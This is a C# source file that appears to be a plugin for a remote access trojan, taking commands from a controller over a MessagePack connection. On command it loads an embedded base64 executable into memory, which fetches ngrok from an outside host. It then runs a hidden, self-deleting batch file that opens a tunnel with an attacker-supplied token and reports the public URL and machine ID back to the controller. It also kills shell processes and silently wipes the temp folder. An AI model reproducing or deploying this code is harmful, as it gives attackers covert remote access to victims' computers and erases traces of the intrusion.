using MessagePackLib.MessagePack;
using Plugin.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Plugin
{
    public  class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "NgrokStart":
                        {
                            frok(unpack_msgpack.ForcePathObject("token").AsString, unpack_msgpack.ForcePathObject("port").AsString, unpack_msgpack.ForcePathObject("proto").AsString);
                            break;
                        }
                    case "NgrokStop":
                        {
                            Stopwatch();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Stopwatch()
        {
            killnk();
            cleantemp();
        }

        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        //
        public static void get()
        {
            Byte[] rdpinstallbytes = Convert.FromBase64String("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UHJvdG9jb2xUeXBlAGdldF9PU0FyY2hpdGVjdHVyZQBnZXRfQ3VsdHVyZQBzZXRfQ3VsdHVyZQByZXNvdXJjZUN1bHR1cmUAQXBwbGljYXRpb25TZXR0aW5nc0Jhc2UARGlzcG9zZQBFZGl0b3JCcm93c2FibGVTdGF0ZQBTVEFUaHJlYWRBdHRyaWJ1dGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBHZW5lcmF0ZWRDb2RlQXR0cmlidXRlAERlYnVnZ2VyTm9uVXNlckNvZGVBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB2YWx1ZQBzZXRfRXhwZWN0MTAwQ29udGludWUAZG93bmFuZGV4ZWNuZ3Jvay5leGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUb1N0cmluZwBHZXRUZW1wUGF0aABwYXRoAGdldF9MZW5ndGgAbGVuZ3RoAGRvd25hbmRleGVjbmdyb2sAU3lzdGVtLkNvbXBvbmVudE1vZGVsAHNldF9TZWN1cml0eVByb3RvY29sAG5ncm9rX2Rvd25sb2FkX3VybABQcm9ncmFtAFN5c3RlbS5JTy5Db21wcmVzc2lvbi5GaWxlU3lzdGVtAFJhbmRvbQByYW5kb20ASXNPU1BsYXRmb3JtAHJlc291cmNlTWFuAE1haW4AU3lzdGVtLklPLkNvbXByZXNzaW9uAFJ1bnRpbWVJbmZvcm1hdGlvbgBTeXN0ZW0uQ29uZmlndXJhdGlvbgBTeXN0ZW0uR2xvYmFsaXphdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBDdWx0dXJlSW5mbwBDaGFyAGdldF9SZXNvdXJjZU1hbmFnZXIAU2VydmljZVBvaW50TWFuYWdlcgBTeXN0ZW0uQ29kZURvbS5Db21waWxlcgAuY3RvcgAuY2N0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAFN5c3RlbS5SZXNvdXJjZXMAZG93bmFuZGV4ZWNuZ3Jvay5Qcm9wZXJ0aWVzLlJlc291cmNlcy5yZXNvdXJjZXMARGVidWdnaW5nTW9kZXMAZG93bmFuZGV4ZWNuZ3Jvay5Qcm9wZXJ0aWVzAFNldHRpbmdzAENvbnRhaW5zAGdldF9DaGFycwBjaGFycwByYWRvbXN0cnMAZ2V0X1dpbmRvd3MAQ29uY2F0AE9iamVjdABTeXN0ZW0uTmV0AGdldF9EZWZhdWx0AFdlYkNsaWVudABFbnZpcm9ubWVudABTdGFydABOZXh0AGdldF9Bc3NlbWJseQBFeHRyYWN0VG9EaXJlY3RvcnkARW1wdHkAAAAAABNuAGcAcgBvAGsALgB6AGkAcAAAE0MAOgBcAFUAcwBlAHIAcwBcAAAnXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcAAAAQAHMwA4ADYAAAthAG0AZAA2ADQAAICHaAB0AHQAcABzADoALwAvAGIAaQBuAC4AZQBxAHUAaQBuAG8AeAAuAGkAbwAvAGMALwA0AFYAbQBEAHoAQQA3AGkAYQBIAGIALwBuAGcAcgBvAGsALQBzAHQAYQBiAGwAZQAtAHcAaQBuAGQAbwB3AHMALQBhAG0AZAA2ADQALgB6AGkAcAABgINoAHQAdABwAHMAOgAvAC8AYgBpAG4ALgBlAHEAdQBpAG4AbwB4AC4AaQBvAC8AYwAvADQAVgBtAEQAegBBADcAaQBhAEgAYgAvAG4AZwByAG8AawAtAHMAdABhAGIAbABlAC0AdwBpAG4AZABvAHcAcwAtADMA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");
            Task.Factory.StartNew(() => Execute(rdpinstallbytes)).Wait();

        }

        #region RuntoMem
        public static void Execute(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }
        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }

        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }
        #endregion
        public static  void frok(string token, string port, string proto)
        {
            string rdpzip = Path.Combine(Path.GetTempPath(), "ngrok.zip");
            string helmetpath = Path.Combine(Path.GetTempPath(), "ngrok.exe");
            get();
            while (!File.Exists(helmetpath))
            {

            }
            try
            {

                string helmetlog = Path.Combine(Path.GetTempPath(), "proclog.txt");
                System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "grok.bat"));
                file.WriteLine("set logFile=" + helmetlog + "");
                file.WriteLine("set exeFile=" + helmetpath + "");
                file.WriteLine("%exeFile% authtoken " + token);
                file.WriteLine("%exeFile% " + proto + " " + port + " > %logFile%");
                file.WriteLine("del %exeFile%");
                file.WriteLine("del \"%~f0\"");
                file.Close();
                string frogc = Path.Combine(Path.GetTempPath(), "grok.bat");
                Process.Start(new ProcessStartInfo
                {
                    FileName = frogc,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });
                SendUrl();

            }
            catch (Exception)
            {
                //return string.Empty;
            }


        }


        public static void SendUrl()
        {
            /*
            while (!Directory.Exists(@"C:\Program Files\RDP Wrapper"))
            {

            }
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            string patchoffile = Path.Combine(pathofrdp, "tunnel.txt");
            File.WriteAllText(patchoffile, PublicUrl());
            string cont = File.ReadAllText(patchoffile);

            */
            while (!PublicUrl().Contains("ngrok"))
            {
                Thread.Sleep(5000);
                Packet.Log("Waiting to capture link" + PublicUrl());
            }
            //Packet.Log("Reverse Connection Started Successfully!URL:" + PublicUrl());
            Connection.Send(InformationList());
            
        }
        public static byte[] InformationList()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Login";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("login").AsString = PublicUrl();
            return msgpack.Encode2Bytes();
        }
        public static string PublicUrl()
        {
            string vncinfo = string.Empty;
            string vnc = vncinfo;
            try
            {

                WebClient client = new WebClient();
                using (Stream data = client.OpenRead(@"http://127.0.0.1:4040/api/tunnels"))
                {
                    using (StreamReader reader = new StreamReader(data))
                    {
                        string content = reader.ReadToEnd();
                        string pattern = @"((tcp?|http?|tcp|http):((//)|(\\\\))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)";
                        MatchCollection matches = Regex.Matches(content, pattern);
                        foreach (Match match in matches)
                        {
                            //vncinfo = Convert.ToString(match);
                            string toBeSearched = "tcp://";
                            string vnci = Convert.ToString(match);
                            vncinfo = vnci.Substring(vnci.IndexOf(toBeSearched) + toBeSearched.Length);
                        }
                        foreach (Match match in matches)
                        {
                            //vncinfo = Convert.ToString(match);
                            string toBeSearched = "http://";
                            string vnci = Convert.ToString(match);
                            vncinfo = vnci.Substring(vnci.IndexOf(toBeSearched) + toBeSearched.Length);
                        }

                    }
                }
                return (!string.IsNullOrEmpty(vncinfo)) ? vncinfo : "N/A";
            }
            catch
            {
            }


            return vnc;
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static string BCutEncrypt(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ (uint)ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }
        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        public static void killnk()
        {
            foreach (var process in Process.GetProcessesByName("ngrok.exe"))
            {
                process.Kill();
            }
            foreach (var process in Process.GetProcessesByName("ngrok"))
            {
                process.Kill();
            }
            foreach (var process in Process.GetProcessesByName("conhost"))
            {
                process.Kill();
            }
            foreach (var process in Process.GetProcessesByName("cmd"))
            {
                process.Kill();
            }
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b taskkill /IM \"ngrok.exe\" /F & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b taskkill /IM \"ngrok\" /F & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        //taskkill /IM "process name" /F

    }

}